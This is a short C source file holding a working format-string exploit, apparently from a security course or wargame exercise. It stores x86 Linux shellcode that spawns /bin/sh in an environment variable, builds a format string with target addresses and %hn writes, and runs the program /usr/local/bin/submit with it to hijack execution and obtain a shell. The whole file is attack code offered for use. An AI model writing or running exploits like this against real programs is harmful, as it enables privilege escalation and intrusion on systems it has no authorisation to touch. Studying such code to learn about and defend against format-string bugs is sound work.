#include <stdlib.h>
#include <stdio.h>

#define TARGET      "/usr/local/bin/submit"
#define GETEGG              "/share/getegg"

char egg[] =
  "EGG="
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char format[] =
  "\xf8\xa1\x04\x08\xfa\xa1\x04\x08"
  "%057264x%111$hn%0008199x%112$hn";

void main(int argc, char *argv[]) {
  char *args[3];
  char *env[2];

  printf("A lot of zeros will be printed, please do not be alarmed!\n");

  args[0] = TARGET;
  args[1] = format;
  args[2] = NULL;

  env[0] = egg;
  env[1] = NULL;

  execve(args[0], args, env);
  exit(0);
}
